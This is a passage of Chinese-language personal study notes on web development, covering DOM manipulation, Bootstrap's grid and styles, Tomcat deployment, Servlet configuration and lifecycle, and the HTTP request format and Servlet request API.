title="Element：元素对象"></a>Element：元素对象</h3><ol><li>获取/创建：通过document来获取和创建</li><li>方法：<ol><li>removeAttribute()：删除属性</li><li>setAttribute()：设置属性</li></ol></li></ol><h3 id="Node：节点对象，其他5个的父对象"><a href="#Node：节点对象，其他5个的父对象" class="headerlink" title="Node：节点对象，其他5个的父对象"></a>Node：节点对象，其他5个的父对象</h3><pre><code class="hljs">* 特点：所有dom对象都可以被认为是一个节点* 方法：    * CRUD dom树：        * appendChild()：向节点的子节点列表的结尾添加新的子节点。        * removeChild()：删除（并返回）当前节点的指定子节点。        * replaceChild()：用新节点替换一个子节点。* 属性：    * parentNode 返回节点的父节点。</code></pre><h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><ol><li><p>标签体的设置和获取：innerHTML</p></li><li><p>使用html元素对象的属性</p></li><li><p>控制元素样式</p><ol><li><p>使用元素的style属性来设置<br>如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//修改样式方式1</span><br>div1.<span class="hljs-property">style</span>.<span class="hljs-property">border</span> = <span class="hljs-string">&quot;1px solid red&quot;</span>;<br>div1.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">&quot;200px&quot;</span>;<br><span class="hljs-comment">//font-size--&gt; fontSize</span><br>div1.<span class="hljs-property">style</span>.<span class="hljs-property">fontSize</span> = <span class="hljs-string">&quot;20px&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>提前定义好类选择器的样式，通过元素的className属性来设置其class属性值。</p></li></ol></li></ol><h1 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><ol><li>概念： 一个前端开发的框架，Bootstrap，来自 Twitter，是目前很受欢迎的前端框架。Bootstrap 是基于 HTML、CSS、JavaScript 的，它简洁灵活，使得 Web 开发更加快捷。<ul><li>框架:一个半成品软件，开发人员可以在框架基础上，在进行开发，简化编码。</li><li>好处：<ol><li>定义了很多的css样式和js插件。我们开发人员直接可以使用这些样式和插件得到丰富的页面效果。</li><li>响应式布局。<ul><li>同一套页面可以兼容不同分辨率的设备。</li></ul></li></ol></li></ul></li></ol><h2 id="快速入门-2"><a href="#快速入门-2" class="headerlink" title="快速入门"></a>快速入门</h2><ol><li>下载Bootstrap</li><li>在项目中将这三个文件夹复制</li><li>创建html页面，引入必要的资源文件</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Bootstrap test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Bootstrap --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./css/bootstrap.min.css&quot;</span> &gt;</span><br><br>    <span class="hljs-comment">&lt;!-- jQuery (Bootstrap 的所有 JavaScript 插件都依赖 jQuery，所以必须放在前边) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/jquery-3.2.1.min.js&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/bootstrap.min.js&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你好，世界！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h2><ul><li><p>同一套页面可以兼容不同分辨率的设备。</p></li><li><p>实现：依赖于栅格系统：将一行平均分成12个格子，可以指定元素占几个格子</p></li><li><p>步骤：</p><ol><li>定义容器。相当于之前的table、<ul><li>容器分类：<ol><li>container：两边留白</li><li>container-fluid：每一种设备都是100%宽度</li></ol></li></ul></li><li>定义行。相当于之前的tr   样式：row</li><li>定义元素。指定该元素在不同的设备上，所占的格子数目。样式：col-设备代号-格子数目<ul><li>设备代号：<ol><li>xs：超小屏幕 手机 (<768px)：<code>col-xs-12</code></li><li>sm：小屏幕 平板 (≥768px)</li><li>md：中等屏幕 桌面显示器 (≥992px)</li><li>lg：大屏幕 大桌面显示器 (≥1200px)</li></ol></li></ul></li></ol><ul><li>注意：<ol><li>一行中如果格子数目超过12，则超出部分自动换行。</li><li>栅格类属性可以向上兼容。栅格类适用于与屏幕宽度大于或等于分界点大小的设备。</li><li>如果真实设备宽度小于了设置栅格类属性的设备代码的最小值，会一个元素占满一整行。</li></ol></li></ul></li></ul><h2 id="CSS样式和JS插件"><a href="#CSS样式和JS插件" class="headerlink" title="CSS样式和JS插件"></a>CSS样式和JS插件</h2><ol><li><p>全局CSS样式：</p><ul><li><p>按钮：class="btn btn-default"</p></li><li><p>图片：</p><ul><li>class="img-responsive"：图片在任意尺寸都占100%</li><li>图片形状<ul><li><img src="../../../Desktop/       /web学习/📒/..." alt="..." class="img-rounded">：方形</li><li><img src="../../../Desktop/       /web学习/📒/..." alt="..." class="img-circle"> ： 圆形</li><li><img src="../../../Desktop/       /web学习/📒/..." alt="..." class="img-thumbnail"> ：相框</li></ul></li></ul><blockquote><p>一个标签可以有多个class属性</p><p>alt属性提供替代图片的信息，使屏幕阅读器能获取到关于图片的信息</p></blockquote></li><li><p>表格</p><ul><li>table</li><li>table-bordered</li><li>table-hover</li></ul></li><li><p>表单</p><ul><li>给表单项添加：class="form-control"</li></ul></li></ul></li><li><p>组件：</p><ul><li>导航条</li><li>分页条</li></ul></li><li><p>插件：</p><ul><li>轮播图</li></ul></li></ol><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>赋值函数时，不要加括号，只写函数名才表示对象</li></ul><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>tomcat bin目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sh ./startup.sh<br></code></pre></td></tr></table></figure><p>访问localhost:8080</p><blockquote><p>可以通过配置文件设置端口为80，80端口号是http协议的默认端口号，访问网址不需要加端口号</p></blockquote><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><p>tomcat bin目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sh ./shutdown.sh<br></code></pre></td></tr></table></figure><h2 id="部署项目方式"><a href="#部署项目方式" class="headerlink" title="部署项目方式"></a>部署项目方式</h2><h3 id="1-直接将项目放到webapps目录下即可"><a href="#1-直接将项目放到webapps目录下即可" class="headerlink" title="1.直接将项目放到webapps目录下即可"></a>1.直接将项目放到webapps目录下即可</h3><p>项目以文件夹分开</p><ul><li>/hello：项目的访问路径-->虚拟目录</li><li>简化部署：将项目打成一个war包，再将war包放置到webapps目录下。<br>- war包会自动解压缩</li></ul><blockquote><p>war包加入webapps目录时会自动添加同名文件夹，删除war包也会自动删除文件夹</p></blockquote><h3 id="2-配置conf-server-xml文件"><a href="#2-配置conf-server-xml文件" class="headerlink" title="2.配置conf/server.xml文件"></a>2.配置conf/server.xml文件</h3><p>在<Host>标签体中配置<br><code>&lt;Context docBase=&quot;D:\hello&quot; path=&quot;/hehe&quot; /&gt;</code></p><ul><li>docBase:项目存放的路径</li><li>path：虚拟目录</li></ul><blockquote><p>网页访问的时候用虚拟目录</p><p>但不安全,修改server.xml必须重启tomcat</p></blockquote><h3 id="3-在conf-Catalina-localhost创建任意名称的xml文件。"><a href="#3-在conf-Catalina-localhost创建任意名称的xml文件。" class="headerlink" title="3.在conf\Catalina\localhost创建任意名称的xml文件。"></a>3.在conf\Catalina\localhost创建任意名称的xml文件。</h3><p>在文件中编写</p><p><code>&lt;Context docBase=&quot;D:\hello&quot; /&gt;</code></p><ul><li>虚拟目录：xml文件的名称</li></ul><blockquote><p>比如创建了context.xml在localhost文件夹下，内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Context</span> <span class="hljs-attr">docBase</span>=<span class="hljs-string">&quot;/Users/sloth/Sites/localhost/xxe-lab&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>只需要访问<a href="http://localhost:8080/context/php_XXE/">http://localhost:8080/context/php_XXE/</a></p></blockquote><h2 id="静态目录和动态目录"><a href="#静态目录和动态目录" class="headerlink" title="静态目录和动态目录"></a>静态目录和动态目录</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>java动态项目的目录结构：</p><p>-- 项目的根目录（ROOT）<br>    -- WEB-INF目录：<br>        -- web.xml：web项目的核心配置文件<br>        -- classes目录：放置字节码文件的目录<br>        -- lib目录：放置依赖的jar包</p><h3 id="将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目"><a href="#将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目" class="headerlink" title="将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目"></a>将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目</h3><h1 id="Servelet-server-applet"><a href="#Servelet-server-applet" class="headerlink" title="Servelet--server applet"></a>Servelet--server applet</h1><h3 id="概念：运行在服务器端的小程序"><a href="#概念：运行在服务器端的小程序" class="headerlink" title="概念：运行在服务器端的小程序"></a>概念：运行在服务器端的小程序</h3><ul><li>Servlet就是一个接口，定义了Java类被浏览器访问到(tomcat识别)的规则。</li><li>将来我们自定义一个类，实现Servlet接口，复写方法。</li></ul><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5ier7fakoj212a0howfv.jpg" alt="image-20220825021654848"></p><blockquote><p>Servlet相关类和方法在Java EE中</p></blockquote><h2 id="快速入门-3"><a href="#快速入门-3" class="headerlink" title="快速入门"></a>快速入门</h2><ol><li><p>创建JavaEE项目</p></li><li><p>定义一个类，实现Servlet接口</p><ul><li>public class ServletDemo1 implements Servlet</li></ul></li><li><p>实现接口中的抽象方法</p></li><li><p>配置Servlet<br>在web.xml中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--配置Servlet --&gt;</span><br><span class="hljs-comment">&lt;!--给class重新定了个名字 servlet-name标签内容--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>demo1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.itcast.web.servlet.ServletDemo1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-comment">&lt;!--通过 /demo1 访问命名为demo1的类--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>demo1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/demo1<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h2><ol><li><p>当服务器接受到客户端浏览器的请求后，会解析请求URL路径，获取访问的Servlet的资源路径</p></li><li><p>查找web.xml文件，是否有对应的<url-pattern>标签体内容。</p></li><li><p>如果有，则在找到对应的<servlet-class>全类名</p></li><li><p>tomcat会将字节码文件加载进内存，并且创建其对象</p></li><li><p>调用其方法</p></li></ol><h2 id="生命周期方法"><a href="#生命周期方法" class="headerlink" title="生命周期方法"></a>生命周期方法</h2><h3 id="被创建：执行init方法，只执行一次"><a href="#被创建：执行init方法，只执行一次" class="headerlink" title="被创建：执行init方法，只执行一次"></a>被创建：执行init方法，只执行一次</h3><h4 id="Servlet什么时候被创建？"><a href="#Servlet什么时候被创建？" class="headerlink" title="Servlet什么时候被创建？"></a>Servlet什么时候被创建？</h4><ul><li><p>默认情况下，第一次被访问时，Servlet被创建</p></li><li><p>可以配置执行Servlet的创建时机。 web.xml中</p><ul><li><p>在<servlet>标签下配置</p><ol><li><p>第一次被访问时，创建</p><ul><li><load-on-startup>的值为负数 默认值为-1</li></ul></li><li><p>在服务器启动时，创建</p><ul><li><p><load-on-startup>的值为0或正整数 一般配0-10</p><blockquote><p>越小的整数优先级越高</p></blockquote></li></ul></li></ol></li></ul></li></ul><ul><li>Servlet的init方法，只执行一次，说明一个Servlet在内存中只存在一个对象，Servlet是单例的</li><li>多个用户同时访问时，可能存在线程安全问题。<br>* 解决：尽量不要在Servlet中定义成员变量。即使定义了成员变量，也不要对修改值</li></ul><h3 id="提供服务：执行service方法，执行多次"><a href="#提供服务：执行service方法，执行多次" class="headerlink" title="提供服务：执行service方法，执行多次"></a>提供服务：执行service方法，执行多次</h3><ul><li>每次访问Servlet时，Service方法都会被调用一次。</li></ul><h3 id="被销毁：执行destroy方法，只执行一次"><a href="#被销毁：执行destroy方法，只执行一次" class="headerlink" title="被销毁：执行destroy方法，只执行一次"></a>被销毁：执行destroy方法，只执行一次</h3><ul><li>Servlet被销毁时执行。服务器关闭时，Servlet被销毁</li><li>只有服务器<u>正常关闭</u>时，才会执行destroy方法。</li><li>destroy方法在Servlet被销毁之前执行，一般用于释放资源</li></ul><h2 id="注解配置"><a href="#注解配置" class="headerlink" title="注解配置"></a>注解配置</h2><ul><li><p>Servlet3.0：</p><ul><li>好处：支持注解配置。可以不需要web.xml了。</li></ul></li><li><p>步骤：</p><ol><li><p>创建JavaEE项目，选择Servlet的版本3.0以上，可以不创建web.xml</p></li><li><p>定义一个类，实现Servlet接口</p></li><li><p>复写方法</p></li><li><p>在类上使用@WebServlet注解，进行配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;资源路径&quot;)</span><br><span class="hljs-meta">@WebServlet(urlPatterns = &quot;/demo&quot;)</span> <span class="hljs-comment">//通过/demo访问</span><br><span class="hljs-meta">@WebServlet(value = &quot;/demo&quot;)</span><br><span class="hljs-meta">@WebServlet(&quot;/demo&quot;)</span> <span class="hljs-comment">//最简洁</span><br></code></pre></td></tr></table></figure></li></ol></li></ul><p>该注解具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> WebServlet &#123;<br>    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//相当于&lt;Servlet-name&gt;</span><br><br>    String[] value() <span class="hljs-keyword">default</span> &#123;&#125;;<span class="hljs-comment">//代表urlPatterns()属性配置</span><br><br>    String[] urlPatterns() <span class="hljs-keyword">default</span> &#123;&#125;;<span class="hljs-comment">//相当于&lt;url-pattern&gt;</span><br><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//相当于&lt;load-on-startup&gt;</span><br><br>    WebInitParam[] initParams() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">asyncSupported</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;<br><br>    String <span class="hljs-title function_">smallIcon</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    String <span class="hljs-title function_">largeIcon</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    String <span class="hljs-title function_">description</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    String <span class="hljs-title function_">displayName</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IDEA与tomcat的相关配置"><a href="#IDEA与tomcat的相关配置" class="headerlink" title="IDEA与tomcat的相关配置"></a>IDEA与tomcat的相关配置</h2><ol><li><p>IDEA会为每一个tomcat部署的项目单独建立一份配置文件</p><ul><li>查看控制台的log：Using CATALINA_BASE:   "/Users/sloth/Library/Caches/JetBrains/IntelliJIdea2021.3/tomcat/156bc142-4965-43d6-8ff6-003e52b2fb0f"</li></ul></li><li><p>工作空间项目和tomcat部署的web项目</p><ul><li>tomcat真正访问的是“tomcat部署的web项目”，"tomcat部署的web项目"对应着"工作空间项目" 的web目录下的所有资源</li><li>WEB-INF目录下的资源不能被浏览器直接访问。</li></ul></li><li><p>断点调试：使用"小虫子"启动 dubug 启动</p></li></ol><h2 id="Servlet的体系结构"><a href="#Servlet的体系结构" class="headerlink" title="Servlet的体系结构"></a>Servlet的体系结构</h2><p>Servlet -- 接口<br>        |<br>GenericServlet -- 抽象类<br>        |<br>HttpServlet  -- 抽象类</p><ul><li><p>GenericServlet：将Servlet接口中其他的方法做了默认空实现，只将service()方法作为抽象</p></li><li><p>将来定义Servlet类时，可以继承GenericServlet，实现service()方法即可</p></li></ul><ul><li>HttpServlet：对http协议的一种封装，简化操作<br>1. 定义类继承HttpServlet<br> 2. 只需要复写doGet/doPost/。。。(HTTP7种请求方式)方法，对get post等方式接收对数据处理方法</li></ul><blockquote><p>浏览器直接访问网址，默认发送get请求</p></blockquote><h2 id="Servlet相关配置"><a href="#Servlet相关配置" class="headerlink" title="Servlet相关配置"></a>Servlet相关配置</h2><p>urlpartten:Servlet访问路径</p><ul><li>一个Servlet可以定义多个访问路径 ： @WebServlet({"/d4","/dd4","/ddd4"})</li><li>路径定义规则<ol><li>/xxx：路径匹配</li><li>/xxx/xxx:多层路径，目录结构 <code>/test/*</code> (*通配符可以匹配任意，因此这个表示只要访问test后跟任意目录，<code>*</code>的优先级较低)</li><li>*.do：扩展名匹配 (do可以改成任意后缀名，前面不加/)</li></ol></li></ul><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h3 id="概念：Hyper-Text-Transfer-Protocol-超文本传输协议"><a href="#概念：Hyper-Text-Transfer-Protocol-超文本传输协议" class="headerlink" title="概念：Hyper Text Transfer Protocol 超文本传输协议"></a>概念：Hyper Text Transfer Protocol 超文本传输协议</h3><ul><li><p>传输协议：定义了，客户端和服务器端通信时，发送数据的格式</p></li><li><p>特点：</p><ol><li>基于TCP/IP的高级协议</li><li>默认端口号:80</li><li>基于请求/响应模型的:一次请求对应一次响应</li><li>无状态的：每次请求之间相互独立，不能交互数据</li></ol></li><li><p>历史版本：<br>* 1.0：每一次请求响应都会建立新的连接<br>* 1.1：复用连接</p></li></ul><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><h3 id="请求消息数据格式"><a href="#请求消息数据格式" class="headerlink" title="请求消息数据格式"></a>请求消息数据格式</h3><ol><li><p>请求行</p><ul><li><p>格式： 请求方式 请求url 请求协议/版本</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /login.htmlHTTP/1.1<br></code></pre></td></tr></table></figure></li></ul><ul><li>请求方式：<br>HTTP协议有7中请求方式，常用的有2种<ul><li>GET：<ol><li>请求参数在请求行中，在url后。</li><li>请求的url长度有限制的</li><li>不太安全</li></ol></li><li>POST:<ol><li>请求参数在请求体中</li><li>请求的url长度没有限制的</li><li>相对安全</li></ol></li></ul></li></ul></li><li><p>请求头: 客户端浏览器告诉服务器一些信息</p><ul><li><p>格式：请求头名称: 请求头值</p></li><li><p>常见的请求头：</p><ol><li><p>User-Agent：浏览器告诉服务器，我访问你使用的浏览器版本信息</p><ul><li>可以在服务器端获取该头的信息，解决浏览器的兼容性问题</li></ul></li><li><p>Referer：<a href="http://localhost/login.html">http://localhost/login.html</a></p><ul><li><p>告诉服务器，我(当前请求)从哪里来？</p><p>作用：</p><ol><li><p>防止盗取链接</p></li><li><p>统计工作</p></li></ol></li></ul></li></ol></li></ul></li><li><p>请求空行<br>一个空行，就是用于分割POST请求的请求头，和请求体的。</p></li><li><p>请求体(正文)：</p><ul><li>封装POST请求消息的请求参数的 （放post参数的，get没有）</li></ul></li></ol><h4 id="字符串格式："><a href="#字符串格式：" class="headerlink" title="字符串格式："></a>字符串格式：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /login.htmlHTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/login.html<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br>username=zhangsan<br></code></pre></td></tr></table></figure><blockquote><p><code>Connection: keep-alive</code>表示可以复用的连接</p></blockquote><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><h3 id="request对象和response对象的原理"><a href="#request对象和response对象的原理" class="headerlink" title="request对象和response对象的原理"></a>request对象和response对象的原理</h3><ol><li>request和response对象是由服务器创建的。我们来使用它们</li><li>request对象是来获取请求消息，response对象是来设置响应消息</li></ol><h3 id="request对象继承体系结构"><a href="#request对象继承体系结构" class="headerlink" title="request对象继承体系结构"></a>request对象继承体系结构</h3><p>ServletRequest        --    接口<br>    |    继承<br>HttpServletRequest    -- 接口<br>    |    实现<br>org.apache.catalina.connector.RequestFacade 类(tomcat)</p><h3 id="request功能"><a href="#request功能" class="headerlink" title="request功能"></a>request功能</h3><ol><li><p>获取请求消息数据</p><ol><li><p>获取请求行数据</p><ul><li><p>GET /day14/demo1?name=zhangsan HTTP/1.1</p></li><li><p>方法：</p><ol><li>获取请求方式 ：GET</li></ol><ul><li>String getMethod()</li></ul><ol start="2"><li>(*)获取虚拟目录：/day14</li></ol><ul><li>String getContextPath()</li></ul><ol start="3"><li>获取Servlet路径: /demo1</li></ol><ul><li>String getServletPath()</li></ul><ol start="4"><li>获取get方式请求参数：name=zhangsan (如果有多个用&连接)</li></ol><ul><li>String getQueryString()</li></ul><ol start="5"><li>(*)获取请求URI：/day14/demo1</li></ol><ul><li><p>String getRequestURI():        /day14/demo1</p></li><li><p>StringBuffer getRequestURL()  :<a href="http://localhost/day14/demo1">http://localhost/day14/demo1</a></p></li><li><p>URL:统一资源定位符 ： <a href="http://localhost/day14/demo1">http://localhost/day14/demo1</a>    中华人民共和国</p></li><li><p>URI：统一资源标识符 : /day14/demo1                    共和国</p></li></ul><ol start="6"><li>获取协议及版本：HTTP/1.1</li></ol><ul><li>String getProtocol()</li></ul><ol start="7"><li>获取客户机的IP地址：</li></ol><ul><li>String getRemoteAddr()</li></ul></li></ul></li></ol></li><li><p>获取请求头数据<br>* 方法：</p><ul><li>(*)String getHeader(String name):通过请求头的名称获取请求头的值</li><li>Enumeration<String> getHeaderNames():获取所有的请求头名称</li></ul></li><li><p>获取请求体数据:</p></li></ol><ul><li><p>请求体：只有POST请求方式，才有请求体，在请求体中封装了POST请求的请求参数</p></li><li><p>步骤：</p><ol><li>获取流对象</li></ol><ul><li>BufferedReader getReader()：获取字符输入流，只能操作字符数据</li><li>ServletInputStream getInputStream()：获取字节输入流，可以操作所有类型数据<ul><li>在文件上传知识点后讲解</li></ul></li></ul><ol start="2"><li>再从流对象中拿数据</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取请求体</span><br><span class="hljs-comment">//获取字符流</span><br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> request.getReader();<br><span class="hljs-comment">//读数据</span><br>String line=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">while</span>((line= br.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>    System.out.println(line);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>作用：管理jar包、主动运行java</p><p>核心配置文件 pom.xml</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" 